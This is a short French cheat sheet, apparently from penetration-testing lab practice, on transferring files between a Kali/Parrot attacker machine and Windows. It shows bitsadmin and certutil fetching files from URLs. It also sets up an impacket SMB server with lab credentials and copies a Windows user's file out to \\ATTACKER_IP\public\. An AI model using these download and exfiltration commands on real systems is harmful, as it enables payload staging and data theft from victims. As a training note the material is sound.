# Pour récuperer à partir de kali/parrot

Windows a son propre utilitaire de téléchargement en ligne de commande - BITSAdmin :

    BITSAdmin est un outil de ligne de commande que vous pouvez utiliser pour créer des tâches de téléchargement ou de téléchargement et surveiller leur progression.

EDIT : 26.01.15 - Voici mon aperçu de la façon dont un fichier peut être téléchargé sur Windows sans outils externes

Et un exemple complet de bitsadmin:

bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip

Edit : 15.05.2018 - Il s'est avéré qu'il est également possible de télécharger un fichier avec certutil :

certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip

Certutil n'est pas installé par défaut sur XP / Win2003, mais est disponible sur les versions Windows les plus récentes. Pour XP / 2003, vous aurez besoin du pack d'outils d'administration pour Windows Server 2003.

# pour recupérer à partir de windows

user@attackerpc$ mkdir [mondossierkali]
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username [THMBackup] -password [CopyMaster555] public [mondossierkali]

C:\> copy C:\Users\THMBackup\monfichierwindows.txt \\ATTACKER_IP\public\